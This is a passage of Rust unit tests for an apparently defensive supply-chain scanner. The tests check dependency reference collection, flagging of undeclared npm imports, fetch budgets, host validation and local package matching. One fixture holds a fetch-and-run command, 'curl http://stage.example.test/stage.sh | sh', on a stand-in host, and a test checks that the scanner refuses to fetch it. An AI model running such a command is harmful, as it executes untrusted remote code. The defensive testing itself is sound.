            locs.iter().any(|l| l == "pkg:npm/declared-dep@1.0.0"),
            "declared dep retained: {locs:?}"
        );
        assert!(
            locs.iter().any(|l| l == "https://stage.test/x.sh"),
            "hunted RUN url merged in: {locs:?}"
        );
    }

    #[test]
    fn member_require_of_undeclared_package_is_flagged() {
        // A package.json declaring `mobx`, and an archive member index.js whose
        // retained AST symbols `require("mobx")` (declared) and
        // `require("db-dx-connector")` (covert). The facts-only import hunt runs
        // on the member without its bytes; the diff flags only the undeclared one.
        let report: AnalysisReport = serde_json::from_value(serde_json::json!({
            "version": "3",
            "files": [
                { "id": 0, "path": "package/package.json", "depth": 1,
                  "file_type": "package_json", "sha256": "cd".repeat(32), "size": 120u64,
                  "filefacts": { "references": [{
                      "locator": {"purl": "pkg:npm/mobx@^6.0.0"}, "kind": "dependency",
                      "source": "package.json", "evidence": "mobx", "offset": 0 }] } },
                { "id": 1, "path": "package/dist/index.js", "depth": 1,
                  "file_type": "javascript", "sha256": "ef".repeat(32), "size": 300u64,
                  "filefacts": { "symbols": [
                      {"kind": "call", "target": "require",
                       "args": [{"shape": "string", "value": "mobx"}]},
                      {"kind": "call", "target": "require",
                       "args": [{"shape": "string", "value": "db-dx-connector"}]}
                  ] } }
            ]
        }))
        .expect("report deserializes");

        // No on-disk root text hunt — a missing path just skips it.
        let groups =
            collect_references(&report, std::path::Path::new("/nonexistent"), CiRefs::Skip);
        let all: Vec<Reference> = groups.iter().flat_map(|(_, r)| r.iter().cloned()).collect();
        let undeclared: Vec<String> = find::undeclared_packages(&all)
            .iter()
            .map(|r| locator(r).to_owned())
            .collect();
        assert!(
            undeclared.contains(&"pkg:npm/db-dx-connector".to_string()),
            "covert member require should be flagged undeclared: {undeclared:?}"
        );
        assert!(
            !undeclared.iter().any(|u| u.contains("mobx")),
            "declared dep must not be flagged: {undeclared:?}"
        );
    }

    #[test]
    fn member_import_does_not_refetch_a_locally_resolvable_npm_package() {
        let report: AnalysisReport = serde_json::from_value(serde_json::json!({
            "version": "3",
            "files": [
                { "id": 0, "path": "bundle/node_modules/express/package.json", "depth": 1,
                  "file_type": "package.json", "sha256": "a".repeat(64), "size": 80u64 },
                { "id": 1, "path": "bundle/node_modules/@scope/tool/package.json", "depth": 1,
                  "file_type": "package.json", "sha256": "b".repeat(64), "size": 80u64 },
                { "id": 2, "path": "bundle/lib/index.js", "depth": 1,
                  "file_type": "javascript", "sha256": "c".repeat(64), "size": 200u64,
                  "filefacts": { "symbols": [
                      {"kind": "call", "target": "require",
                       "args": [{"shape": "string", "value": "express"}]},
                      {"kind": "call", "target": "require",
                       "args": [{"shape": "string", "value": "@scope/tool/subpath"}]},
                      {"kind": "call", "target": "require",
                       "args": [{"shape": "string", "value": "not-vendored"}]}
                  ] } }
            ]
        }))
        .expect("report deserializes");

        let groups =
            collect_references(&report, std::path::Path::new("/nonexistent"), CiRefs::Skip);
        let locs: Vec<String> = groups
            .iter()
            .flat_map(|(_, refs)| refs.iter().map(|r| locator(r).to_owned()))
            .collect();
        assert_eq!(
            locs,
            vec!["pkg:npm/not-vendored"],
            "only an import absent from the ancestor node_modules is external"
        );
    }

    #[test]
    fn sibling_node_modules_does_not_suppress_an_external_import() {
        let report: AnalysisReport = serde_json::from_value(serde_json::json!({
            "version": "3",
            "files": [
                { "id": 0, "path": "one/node_modules/express/package.json", "depth": 1,
                  "file_type": "package.json", "sha256": "a".repeat(64), "size": 80u64 },
                { "id": 1, "path": "two/index.js", "depth": 1,
                  "file_type": "javascript", "sha256": "b".repeat(64), "size": 200u64,
                  "filefacts": { "symbols": [
                      {"kind": "call", "target": "require",
                       "args": [{"shape": "string", "value": "express"}]}
                  ] } }
            ]
        }))
        .expect("report deserializes");

        let groups =
            collect_references(&report, std::path::Path::new("/nonexistent"), CiRefs::Skip);
        let locs: Vec<String> = groups
            .iter()
            .flat_map(|(_, refs)| refs.iter().map(|r| locator(r).to_owned()))
            .collect();
        assert_eq!(locs, vec!["pkg:npm/express"]);
    }

    #[test]
    fn vendored_member_does_not_download_a_missing_import() {
        let report: AnalysisReport = serde_json::from_value(serde_json::json!({
            "version": "3",
            "files": [
                { "id": 0, "path": "bundle/node_modules/qs/test/parse.js", "depth": 1,
                  "file_type": "javascript", "sha256": "a".repeat(64), "size": 200u64,
                  "filefacts": { "symbols": [
                      {"kind": "call", "target": "require",
                       "args": [{"shape": "string", "value": "test-only-package"}]}
                  ] } }
            ]
        }))
        .expect("report deserializes");

        let groups =
            collect_references(&report, std::path::Path::new("/nonexistent"), CiRefs::Skip);
        assert!(
            groups.is_empty(),
            "an absent import inside the captured install tree is not a network fetch"
        );
    }

    #[test]
    fn merge_dedups_against_declared_and_creates_group_for_undeclared_root() {
        // Root declared one ref; the hunt finds that same one plus a new one.
        let mut groups = vec![("rootsha".to_string(), vec![url_ref("https://a.test/x")])];
        merge_into_root(
            &mut groups,
            "rootsha",
            vec![url_ref("https://a.test/x"), url_ref("https://b.test/y")],
        );
        assert_eq!(groups.len(), 1);
        assert_eq!(groups[0].1.len(), 2, "duplicate locator must not be added");

        // A root that declared nothing still receives a group from the hunt.
        let mut empty = Vec::new();
        merge_into_root(&mut empty, "rootsha", vec![url_ref("https://c.test/z")]);
        assert_eq!(
            empty,
            vec![("rootsha".to_string(), vec![url_ref("https://c.test/z")])]
        );
    }

    /// A fetched subtree is renamed to its locator — root and members alike — so
    /// the merged report says where the bytes came from, and so two dependencies
    /// whose URLs end in the same basename stay distinct. Anything keyed on path
    /// (the dependency appendix walks a "<root>!!" prefix) merged them before.
    #[test]
    fn merge_payload_renames_the_subtree_to_its_locator() {
        let sub_report = |name: &str| -> AnalysisReport {
            serde_json::from_value(serde_json::json!({
                "version": "3",
                "files": [
                    {"id": 0, "path": name, "depth": 0, "file_type": "npm",
                     "sha256": "d".repeat(64), "size": 64u64},
                    {"id": 1, "parent_id": 0, "path": format!("{name}!!lib/a.js"), "depth": 1,
                     "file_type": "javascript", "sha256": "e".repeat(64), "size": 32u64},
                ],
            }))
            .expect("sub report")
        };
        let rec_for = |locator: &str, url: &str| FetchRecord {
            source_sha256: None,
            context: None,
            coverage_note: None,
            source_offset: None,
            kind: RefKind::Dependency,
            locator: locator.to_string(),
            resolved_url: Some(url.to_string()),
            final_url: None,
            redirects: Vec::new(),
            status: None,
            headers: Vec::new(),
            fetched_at: None,
            content_sha256: Some("d".repeat(64)),
            size: None,
            served: Some(Served::Network),
            pin_verified: None,
            outcome: Outcome::Ok,
        };

        let mut report: AnalysisReport =
            serde_json::from_value(serde_json::json!({"version": "3", "files": []}))
                .expect("root report");
        let mut graft = Graft::new(&report);

        // Two dependencies whose URLs share a basename — the collision case.
        for (locator, url) in [
            ("pkg:npm/alpha@1.0.0", "https://a.test/index.js"),
            ("pkg:npm/beta@2.0.0", "https://b.test/index.js"),
        ] {
            merge_payload(
                &mut report,
                &mut graft,
                &rec_for(locator, url),
                Analyzed {
                    sub: Some(sub_report("index.js")),
                    content_sha: "d".repeat(64),
                    next_from_bytes: Vec::new(),
                    corpus: None,
                },
            );
        }

        let paths: Vec<&str> = report.files.iter().map(|f| f.path.as_str()).collect();
        assert!(
            paths.contains(&"pkg:npm/alpha@1.0.0") && paths.contains(&"pkg:npm/beta@2.0.0"),
            "each dependency root is named by its locator: {paths:?}",
        );
        assert!(
            paths.contains(&"pkg:npm/alpha@1.0.0!!lib/a.js")
                && paths.contains(&"pkg:npm/beta@2.0.0!!lib/a.js"),
            "members follow their root, so prefix lookups still reach them: {paths:?}",
        );
        assert!(
            !paths.iter().any(|p| p.starts_with("index.js")),
            "no node keeps the URL basename that made the two collide: {paths:?}",
        );
    }

    #[test]
    fn payload_name_prefers_url_basename_then_falls_back_to_hash() {
        let mut rec = FetchRecord {
            source_sha256: None,
            context: None,
            coverage_note: None,
            source_offset: None,
            kind: RefKind::Dependency,
            locator: "pkg:npm/x".to_string(),
            resolved_url: Some("https://reg.test/x/-/x-1.0.0.tgz".to_string()),
            final_url: None,
            redirects: Vec::new(),
            status: None,
            headers: Vec::new(),
            fetched_at: None,
            content_sha256: Some("abc123".to_string()),
            size: None,
            served: Some(Served::Network),
            pin_verified: None,
            outcome: Outcome::Ok,
        };
        assert_eq!(payload_name(&rec), "x-1.0.0.tgz");

        // Query string is stripped.
        rec.resolved_url = Some("https://reg.test/dl?file=stage2.sh".to_string());
        // basename before '?' is "dl" (path component), so query strip applies to it.
        assert_eq!(payload_name(&rec), "dl");

        // No usable basename → content hash.
        rec.resolved_url = Some("https://reg.test/".to_string());
        assert_eq!(payload_name(&rec), "abc123");
    }

    #[test]
    fn parse_bytes_reads_units_and_matches_cli_defaults() {
        // Unit suffixes are 1024-based, case-insensitive, with an optional `B`.
        assert_eq!(parse_bytes("40M"), Ok(40 * MIB));
        assert_eq!(parse_bytes("40m"), Ok(40 * MIB));
        assert_eq!(parse_bytes("40MB"), Ok(40 * MIB));
        assert_eq!(parse_bytes("40mb"), Ok(40 * MIB));
        assert_eq!(parse_bytes("2G"), Ok(2 * GIB));
        assert_eq!(parse_bytes(" 1k "), Ok(1024));
        assert_eq!(parse_bytes("512K"), Ok(512 * 1024));
        // A bare number is bytes; a trailing `B` alone is bytes too.
        assert_eq!(parse_bytes("10240"), Ok(10240));
        assert_eq!(parse_bytes("4096B"), Ok(4096));
        // Garbage, an empty number, or a lone unit are all errors.
        assert!(parse_bytes("").is_err());
        assert!(parse_bytes("abc").is_err());
        assert!(parse_bytes("M").is_err());
        assert!(parse_bytes("1.5G").is_err());

        // The CLI default strings must parse to the matching constants, so the
        // help text and the policy never drift apart.
        assert_eq!(parse_bytes("256M"), Ok(DEFAULT_MAX_FETCH_SIZE));
        assert_eq!(parse_bytes("2G"), Ok(DEFAULT_MAX_FILE_SIZE));
        assert_eq!(parse_bytes("10G"), Ok(DEFAULT_MAX_TOTAL_SIZE));
    }

    fn report_of(files: &serde_json::Value) -> AnalysisReport {
        serde_json::from_value(serde_json::json!({"version": "3", "files": files}))
            .expect("report deserializes")
    }

    /// The batch PURL negotiation's answer is its own case: nothing was
    /// downloaded, yet an adopted verdict becomes a payload to merge, gets its
    /// node, and carries its verdict. It used to be dropped as "no bytes", so
    /// the verdict never left the group that negotiated it.
    #[test]
    fn a_corpus_answer_reaches_the_report_without_a_download() {
        let sha = "e".repeat(64);
        let source = "s".repeat(64);
        let landed = |standing: Standing| {
            let reference = purl_ref("pkg:npm/zaboodle@1.49");
            Landed {
                record: corpus_hit_record(&reference, &source, &sha),
                reference,
                standing,
            }
        };
        let dir = tempfile::tempdir().expect("tempdir");
        let cache = BlobCache::with_dir(dir.path().to_path_buf());
        let opts = AnalysisOptions::default();
        let payloads = Payloads {
            cache: &cache,
            opts: &opts,
            acache: None,
            precheck: None,
        };

        let adopted = landed(Standing::Adopt(Verdict {
            fires_at: crate::model::Level::At(2),
            reason: Some("steals tokens".to_string()),
            findings: Vec::new(),
        }));
        let analyzed = payloads
            .analyze(&adopted)
            .expect("an adopted verdict is a payload to merge");
        assert_eq!(analyzed.content_sha, sha);
        assert!(analyzed.sub.is_none(), "nothing was downloaded or analyzed");
        assert_eq!(
            analyzed.corpus.as_ref().map(|v| v.fires_at),
            Some(crate::model::Level::At(2))
        );

        let mut report = report_of(&serde_json::json!([{
            "id": 0, "path": "package.json", "depth": 0,
            "file_type": "package_json", "sha256": source, "size": 100u64
        }]));
        let mut graft = Graft::new(&report);
        let next = merge_payload(&mut report, &mut graft, &adopted.record, analyzed);
        assert!(next.is_empty());
        let node = report
            .files
            .iter()
            .find(|f| f.sha256 == sha)
            .expect("the adopted dependency has a node");
        assert_eq!(node.path, "pkg:npm/zaboodle@1.49");
        assert_eq!(node.rel, cleave::types::Rel::Fetched);
        assert_eq!(node.parent_id, Some(0));

        // A benign answer from another analyzer carries nothing to report.
        assert!(payloads.analyze(&landed(Standing::SkipBenign)).is_none());
    }

    /// fletch returns records only for the references it fetches and may
    /// refine a locator on the way; the index stamped going in still pairs
    /// every record with its own reference. Pairing by position moved every
    /// record after a skipped reference onto the wrong one.
    #[test]
    fn records_pair_with_their_references_by_key() {
        let mut path = purl_ref("unused");
        path.locator = RefLocator::Path("./lib/index.js".to_string());
        let mut b = purl_ref("pkg:npm/b");
        b.offset = Some(99);
        let selected = vec![purl_ref("pkg:npm/a"), path, b];
        // As fletch answers: nothing for the path, `b` refined to a release.
        let record = |i: usize, locator: &str| FetchRecord {
            source_offset: keyed(&selected[i], i).offset,
            locator: locator.to_string(),
            ..fetched_record()
        };
        let records = vec![record(0, "pkg:npm/a@1.0.0"), record(2, "pkg:npm/b@2.0.0")];
        let mut slots = vec![None; selected.len()];
        pair_records(&selected, records, &mut slots);
        assert_eq!(
            slots[0].as_ref().map(|(r, _)| r.locator.as_str()),
            Some("pkg:npm/a@1.0.0")
        );
        assert!(slots[1].is_none(), "the path was never fetched");
        let (record_b, standing) = slots[2].as_ref().expect("b keeps its own slot");
        assert_eq!(record_b.locator, "pkg:npm/b@2.0.0");
        assert_eq!(
            record_b.source_offset,
            Some(99),
            "the real offset is restored"
        );
        assert!(matches!(standing, Standing::Analyze));
    }

    /// Concurrent fetch phases reserve before the network, so together they
    /// can never spend more than the process-wide budget.
    #[test]
    fn the_total_budget_is_reserved_not_overshot() {
        let total = TotalBudget::new(10, 1_000);
        let want = Allowance {
            fetches: 4,
            bytes: 400,
        };
        let granted: Vec<Allowance> = std::thread::scope(|scope| {
            let handles: Vec<_> = (0..8)
                .map(|_| scope.spawn(|| total.reserve(want)))
                .collect();
            handles
                .into_iter()
                .map(|h| h.join().expect("thread"))
                .collect()
        });
        assert_eq!(granted.iter().map(|g| g.fetches).sum::<usize>(), 10);
        assert_eq!(granted.iter().map(|g| g.bytes).sum::<u64>(), 1_000);
    }

    /// What a fetch did not spend goes back; bytes past its grant — fletch
    /// stops only after the fetch that crossed the cap — come out of what is
    /// left.
    #[test]
    fn a_grant_is_settled_against_what_was_spent() {
        let total = TotalBudget::new(10, 1_000);
        let all = Allowance {
            fetches: usize::MAX,
            bytes: u64::MAX,
        };
        let grant = total.reserve(Allowance {
            fetches: 4,
            bytes: 400,
        });
        total.settle(
            grant,
            Allowance {
                fetches: 1,
                bytes: 100,
            },
        );
        assert_eq!(
            total.reserve(all),
            Allowance {
                fetches: 9,
                bytes: 900
            }
        );
        let total = TotalBudget::new(5, 100);
        let grant = total.reserve(Allowance {
            fetches: 1,
            bytes: 10,
        });
        total.settle(
            grant,
            Allowance {
                fetches: 1,
                bytes: 30,
            },
        );
        assert_eq!(
            total.reserve(all),
            Allowance {
                fetches: 4,
                bytes: 70
            }
        );
    }

    /// One root's budget spans all its hops and declaring files: what an
    /// earlier group spent is gone for the next, per class for the counts and
    /// shared for the bytes.
    #[test]
    fn a_roots_budget_carries_across_groups() {
        let mut budget = RootBudget::new(&FetchPolicy {
            max_file_fetches: 10,
            max_url_fetches: 2,
            max_file_bytes: 100,
            ..FetchPolicy::default()
        });
        budget.spend(
            FetchClass::Deps,
            Allowance {
                fetches: 7,
                bytes: 60,
            },
        );
        assert_eq!(
            budget.want(FetchClass::Deps),
            Allowance {
                fetches: 3,
                bytes: 40
            }
        );
        assert_eq!(
            budget.want(FetchClass::Urls),
            Allowance {
                fetches: 2,
                bytes: 40
            }
        );
        budget.spend(
            FetchClass::Urls,
            Allowance {
                fetches: 5,
                bytes: 90,
            },
        );
        assert_eq!(
            budget.want(FetchClass::Urls),
            Allowance {
                fetches: 0,
                bytes: 0
            }
        );
    }

    /// IPv6 literals are judged by address, not refused for their brackets,
    /// and only a *mapped* IPv4 address is read as IPv4.
    #[test]
    fn ipv6_literals_are_judged_by_address() {
        assert!(valid_host("http://[2606:4700:4700::1111]/payload.bin"));
        assert!(
            valid_host("http://[::ffff:8.8.8.8]/payload.bin"),
            "mapped public v4"
        );
        assert!(
            !valid_host("http://[::ffff:10.0.0.1]/payload.bin"),
            "mapped private v4"
        );
        assert!(
            !valid_host("http://[2001:db8::1]/payload.bin"),
            "documentation range"
        );
        let ip = |s: &str| s.parse::<std::net::IpAddr>().unwrap();
        assert!(!public_ip(ip("::1")), "loopback, never the IPv4 0.0.0.1");
        assert!(!public_ip(ip("::")));
        assert!(public_ip(ip("::8.8.8.8")), "IPv4-compatible is plain IPv6");
    }

    #[test]
    fn a_purl_coordinate_splits_once() {
        let c = Coordinate::of("pkg:npm/%40scope/name@1.2.3?arch=x64#sub").unwrap();
        assert_eq!(
            (c.key, c.typ, c.path, c.version),
            (
                "pkg:npm/%40scope/name",
                "npm",
                "%40scope/name",
                Some("1.2.3")
            )
        );
        // A literal scope `@` opens a segment; it is never a version.
        assert_eq!(Coordinate::of("pkg:npm/@scope/name").unwrap().version, None);
        assert_eq!(
            Coordinate::of("pkg:npm/@scope/name@2.0.0").unwrap().key,
            "pkg:npm/@scope/name"
        );
        // Qualifiers are not part of the version.
        assert_eq!(
            Coordinate::of("pkg:cargo/serde@1.0.219?checksum=abc")
                .unwrap()
                .version,
            Some("1.0.219")
        );
        assert!(Coordinate::of("https://example.test/x@1.zip").is_none());
        assert!(Coordinate::of("pkg:npm").is_none());
        // Every reader shares the one split.
        assert_eq!(versioned_purl("https://example.test/x@1.zip"), None);
        assert_eq!(
            purl_display("pkg:npm/%40scope/pkg@1.2.3"),
            "@scope/pkg 1.2.3"
        );
        assert_eq!(purl_display("pkg:npm/%40scope/pkg"), "@scope/pkg");
        assert_eq!(
            npm_import_name(&purl_ref("pkg:npm/%40scope/tool")).as_deref(),
            Some("@scope/tool")
        );
        assert_eq!(npm_import_name(&purl_ref("pkg:pypi/requests")), None);
    }

    /// The graft index is what a scan of the report would find: ids continue
    /// past the highest, and a parent is the first node with the declaring sha.
    #[test]
    fn the_graft_index_matches_a_scan_of_the_report() {
        let (a, b) = ("a".repeat(64), "b".repeat(64));
        let mut report = report_of(&serde_json::json!([
            {"id": 0, "path": "root", "depth": 0, "file_type": "tar", "sha256": a, "size": 1u64},
            {"id": 5, "parent_id": 0, "path": "root!!m", "depth": 1, "file_type": "json", "sha256": b, "size": 1u64},
            {"id": 2, "parent_id": 5, "path": "root!!m!!n", "depth": 3, "file_type": "json", "sha256": a, "size": 1u64},
        ]));
        let mut graft = Graft::new(&report);
        assert_eq!(graft.next_id, 6);
        assert_eq!(
            graft.parent(Some(&a)),
            (0, 0),
            "the first node with the sha"
        );
        assert_eq!(graft.parent(Some(&b)), (5, 1));
        assert_eq!(
            graft.parent(Some("unknown")),
            (0, 0),
            "falls back to the root"
        );
        assert_eq!(graft.parent(None), (0, 0), "as does no declarer at all");

        let sub = report_of(&serde_json::json!([
            {"id": 0, "path": "x@1.registry.json", "depth": 0, "file_type": "registry", "sha256": "c".repeat(64), "size": 1u64},
            {"id": 1, "parent_id": 0, "path": "x@1.registry.json!!y", "depth": 1, "file_type": "json", "sha256": "d".repeat(64), "size": 1u64},
        ]));
        assert_eq!(merge_registry(&mut report, &mut graft, &b, sub), Some(6));
        let grafted: Vec<(u32, Option<u32>, u32)> = report.files[3..]
            .iter()
            .map(|f| (f.id, f.parent_id, f.depth))
            .collect();
        assert_eq!(grafted, [(6, Some(5), 2), (7, Some(6), 3)]);
        assert_eq!(graft.next_id, 8);
    }
}

#[cfg(test)]
mod dependency_gap_tests {
    use super::*;
    #[test]
    fn real_compact_archive_retains_local_identity_entry_points_and_install_hooks() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("fixture.tar");
        let members: [(&str, &[u8]); 3] = [
            ("package-lock.json", br#"{"lockfileVersion":3,"packages":{"node_modules/tool":{"version":"1.0.0"}}}"#),
            ("node_modules/tool/package.json", br#"{"name":"tool","version":"1.0.0","main":"index.js","scripts":{"postinstall":"npm install companion@2.0.0"}}"#),
            ("node_modules/tool/index.js", b"module.exports = 7;\n"),
        ];
        let mut archive = tar::Builder::new(std::fs::File::create(&path).unwrap());
        for (name, bytes) in members {
            let mut header = tar::Header::new_ustar();
            header.set_size(bytes.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            archive.append_data(&mut header, name, bytes).unwrap();
        }
        archive.finish().unwrap();
        let mut supplied = cleave::Engine::empty()
            .with_compact_members(true)
            .analyze_file(&path, &AnalysisOptions::default())
            .unwrap();
        supplied.finalize();
        let groups = collect_references(&supplied, &path, CiRefs::Skip);
        assert!(
            groups
                .iter()
                .flat_map(|(_, refs)| refs)
                .any(|r| locator(r) == "pkg:npm/companion@2.0.0")
        );
        let (source, references) = groups
            .iter()
            .find(|(_, refs)| refs.iter().any(|r| locator(r) == "pkg:npm/tool@1.0.0"))
            .unwrap();
        let dependency = references
            .iter()
            .find(|r| locator(r) == "pkg:npm/tool@1.0.0")
            .unwrap();
        assert!(
            LocalNpmPackages::from_report(&supplied)
                .declared_coverage(&supplied, source, dependency)
                .is_some()
        );
        let mut pass = session(
            &supplied,
            FetchPolicy {
                deps: true,
                depth: 1,
                ..FetchPolicy::default()
            },
            None,
        );
        pass.run(
            &mut supplied,
            vec![(source.clone(), vec![dependency.clone()])],
        );
        let records = pass.finish(&mut supplied).records;
        assert_eq!(records.len(), 1);
        assert!(matches!(records[0].outcome, Outcome::Skipped));
        assert!(
            records[0]
                .coverage_note
                .as_deref()
                .unwrap()
                .contains("already analyzed")
        );
    }
    fn reference() -> Reference {
        Reference::new(
            RefLocator::Purl("pkg:npm/tool@1.0.0".into()),
            RefKind::Dependency,
            "packages.node_modules/tool",
            "node_modules/tool",
        )
    }
    fn report(prefix: &str, entry: &str, code: bool) -> AnalysisReport {
        let root = format!("{prefix}/node_modules/tool");
        let mut files = vec![
            serde_json::json!({"id":0,"path":format!("{prefix}/package-lock.json"),"file_type":"package_lock_json","sha256":"source","size":1,"depth":0}),
            serde_json::json!({"id":1,"path":format!("{root}/package.json"),"file_type":"package_json","sha256":"manifest","size":1,"depth":1,
                "filefacts":{"values":{"npm":{"name":"tool","version":"1.0.0"}},"references":[{"locator":{"path":entry},"kind":"local","source":"package.json:main","evidence":entry}]}}),
        ];
        if code {
            files.push(serde_json::json!({"id":2,"path":format!("{root}/index.js"),"file_type":"javascript","sha256":"code","size":1,"depth":1}));
        }
        serde_json::from_value(serde_json::json!({"version":"3","files":files})).unwrap()
    }
    fn session(
        report: &AnalysisReport,
        policy: FetchPolicy,
        store: Option<Arc<pending::Store>>,
    ) -> FetchSession {
        static RESOURCES: OnceLock<Resources> = OnceLock::new();
        let resources = RESOURCES.get_or_init(|| Resources {
            net: HttpFetch::new().unwrap(),
            cache: BlobCache::with_dir("/tmp/dependency-gap-test-cache"),
        });
        let mut session =
            FetchSession::new(report, &[], policy, resources, Reporter::Off, false, &[]);
        session.pending = store;
        session
    }
    #[test]
    fn local_matching_requires_exact_identity_version_and_code() {
        let supplied = report("bundle", "./index.js", true);
        let local = LocalNpmPackages::from_report(&supplied);
        assert_eq!(
            local
                .declared_coverage(&supplied, "source", &reference())
                .as_deref(),
            Some("bundle/node_modules/tool")
        );
        for purl in [
            "pkg:npm/tool@2.0.0",
            "pkg:npm/tool",
            "pkg:npm/other@1.0.0",
            "pkg:pypi/tool@1.0.0",
        ] {
            let mut r = reference();
            r.locator = RefLocator::Purl(purl.into());
            assert!(
                local.declared_coverage(&supplied, "source", &r).is_none(),
                "{purl}"
            );
        }
        for (entry, code) in [
            ("./index.js", false),
            ("../index.js", true),
            ("./missing.js", true),
        ] {
            let supplied = report("bundle", entry, code);
            assert!(
                LocalNpmPackages::from_report(&supplied)
                    .declared_coverage(&supplied, "source", &reference())
                    .is_none()
            );
        }
    }
    #[test]
    fn local_matching_never_borrows_sibling_or_shadowed_installations() {
        let mut supplied = report("bundle/other", "index.js", true);
        supplied.files[0].path = "bundle/app/package-lock.json".into();
        assert!(
            LocalNpmPackages::from_report(&supplied)
                .declared_coverage(&supplied, "source", &reference())
                .is_none()
        );
        supplied = report("bundle", "index.js", true);
        supplied.files[0].path = "bundle/app/package.json".into();
        let shadow: cleave::types::FileAnalysis = serde_json::from_value(serde_json::json!({"id":3,"path":"bundle/app/node_modules/tool/package.json","file_type":"package_json","sha256":"shadow","size":1,"depth":1})).unwrap();
        supplied.files.push(shadow);
        assert!(
            LocalNpmPackages::from_report(&supplied)
                .declared_coverage(&supplied, "source", &reference())
                .is_none()
        );
    }
    #[test]
    fn archive_root_installation_resolves_without_crossing_archive_boundary() {
        let mut supplied = report("placeholder", "index.js", true);
        for file in &mut supplied.files {
            file.path = file.path.replace("placeholder/", "bundle.tar!!");
        }
        assert_eq!(
            LocalNpmPackages::from_report(&supplied)
                .declared_coverage(&supplied, "source", &reference())
                .as_deref(),
            Some("bundle.tar!!node_modules/tool")
        );
        supplied.files[0].path = "other.tar!!package-lock.json".into();
        assert!(
            LocalNpmPackages::from_report(&supplied)
                .declared_coverage(&supplied, "source", &reference())
                .is_none()
        );
    }
    #[test]
    fn local_matching_respects_alias_install_paths_and_incomplete_code() {
        let mut supplied = report("archive.tar!!bundle", "index.js", true);
        supplied.files[1].path = supplied.files[1]
            .path
            .replace("node_modules/tool", "node_modules/alias");
        supplied.files[2].path = supplied.files[2]
            .path
            .replace("node_modules/tool", "node_modules/alias");
        let mut r = reference();
        r.context = Some(filefacts::DependencyContext {
            scope: filefacts::DependencyScope::Runtime,
            optional: false,
            has_install_script: false,
            installed_path: Some("node_modules/alias".into()),
        });
        assert!(
            LocalNpmPackages::from_report(&supplied)
                .declared_coverage(&supplied, "source", &r)
                .is_some()
        );
        supplied.files[2]
            .analysis_gaps
            .record(cleave::types::AnalysisGap::SourceParseIncomplete);
        assert!(
            LocalNpmPackages::from_report(&supplied)
                .declared_coverage(&supplied, "source", &r)
                .is_none()
        );
    }
    #[test]
    fn supplied_unpinned_code_is_recorded_without_claiming_integrity() {
        let mut supplied = report("bundle", "index.js", true);
        let mut pass = session(
            &supplied,
            FetchPolicy {
                deps: true,
                depth: 1,
                ..FetchPolicy::default()
            },
            None,
        );
        pass.run(&mut supplied, vec![("source".into(), vec![reference()])]);
        let records = pass.finish(&mut supplied).records;
        assert_eq!(records.len(), 1);
        assert!(matches!(records[0].outcome, Outcome::Skipped));
        assert!(records[0].pin_verified.is_none());
        assert!(records[0].content_sha256.is_none());
        assert!(
            records[0]
                .coverage_note
                .as_deref()
                .unwrap()
                .contains("already analyzed")
        );
    }
    #[test]
    fn development_scope_does_not_outrank_runtime_unless_it_executes_hooks() {
        let runtime = reference();
        let mut dev = reference();
        dev.context = Some(filefacts::DependencyContext {
            scope: filefacts::DependencyScope::Development,
            optional: false,
            has_install_script: false,
            installed_path: None,
        });
        assert!(dependency_execution_priority(&runtime) < dependency_execution_priority(&dev));
        dev.context.as_mut().unwrap().has_install_script = true;
        assert!(dependency_execution_priority(&dev) < dependency_execution_priority(&runtime));
        let supplied = report("bundle", "missing.js", false);
        let mut pass = session(
            &supplied,
            FetchPolicy {
                deps: true,
                include_dev_dependencies: false,
                ..FetchPolicy::default()
            },
            None,
        );
        assert!(pass.select("source", vec![dev], 0, &mut 0).is_empty());
        assert!(
            pass.out.records[0]
                .coverage_note
                .as_deref()
                .unwrap()
                .contains("development-only")
        );
    }
    #[test]
    fn resumed_work_keeps_depth_pins_and_source_and_does_not_bypass_ci_scope() {
        let dir = tempfile::tempdir().unwrap();
        let store = Arc::new(pending::Store::open(&dir.path().join("queue")).unwrap());
        let mut supplied = report("bundle", "missing.js", false);
        let mut r = Reference::new(
            RefLocator::Url("http://stage.example.test/stage.sh".into()),
            RefKind::Command,
            "shell",
            "curl http://stage.example.test/stage.sh | sh",
        );
        r.offset = Some(17);
        r.pinned_hash = Some(filefacts::PinnedHash {
            algo: filefacts::HashAlgo::Sha256,
            value: "a".repeat(64),
        });
        let entry = pending::Entry {
            root_sha: "source".into(),
            source_sha: "original-parent".into(),
            hop: 3,
            reference: r.clone(),
            reason: "depth limit".into(),
            redirect_credit: 0,
        };
        store.update(std::slice::from_ref(&entry), &[]).unwrap();
        let mut pass = session(
            &supplied,
            FetchPolicy {
                urls: true,
                packages: true,
                depth: 2,
                ..FetchPolicy::default()
            },
            Some(store.clone()),
        );
        pass.run(&mut supplied, vec![]);
        assert!(!pass.out.records.is_empty());
        assert!(
            pass.out.records[0]
                .coverage_note
                .as_deref()
                .unwrap()
                .contains("hop=3")
        );
        let saved = store.entries("source").unwrap();
        assert_eq!(saved.len(), 1);
        assert_eq!(saved[0].reference, r);
        // Widening depth tries the same URL; the HTTPS guard refuses it before a socket.
        let mut pass = session(
            &supplied,
            FetchPolicy {
                urls: true,
                packages: true,
                depth: 4,
                ..FetchPolicy::default()
            },
            Some(store.clone()),
        );
        pass.run(&mut supplied, vec![]);
        assert_eq!(
            pass.out.records[0].source_sha256.as_deref(),
            Some("original-parent")
        );
        assert_eq!(pass.out.records[0].source_offset, Some(17));
        assert!(matches!(
            pass.out.records[0].outcome,
            Outcome::Failed(FetchError::Refused(_))
        ));
        assert!(store.entries("source").unwrap().is_empty());
        r.context = Some(filefacts::DependencyContext {
            scope: filefacts::DependencyScope::Ci,
            optional: false,
            has_install_script: false,
            installed_path: None,
        });
        store
            .update(
                &[pending::Entry {
                    reference: r,
                    hop: 0,
                    ..entry
                }],
                &[],
            )
            .unwrap();
        let mut pass = session(
            &supplied,
            FetchPolicy {
                urls: true,
                packages: true,
                ci: false,
                ..FetchPolicy::default()
            },
            Some(store.clone()),
        );
        pass.run(&mut supplied, vec![]);
        assert!(pass.out.records.is_empty());
        assert_eq!(store.entries("source").unwrap().len(), 1);
    }
    #[test]
    fn timeout_defers_unvisited_references_and_keeps_integrity() {
        let dir = tempfile::tempdir().unwrap();
        let store = Arc::new(pending::Store::open(&dir.path().join("queue")).unwrap());
        let mut supplied = report("bundle", "index.js", true);
        let mut r = reference();
        r.pinned_hash = Some(filefacts::PinnedHash {
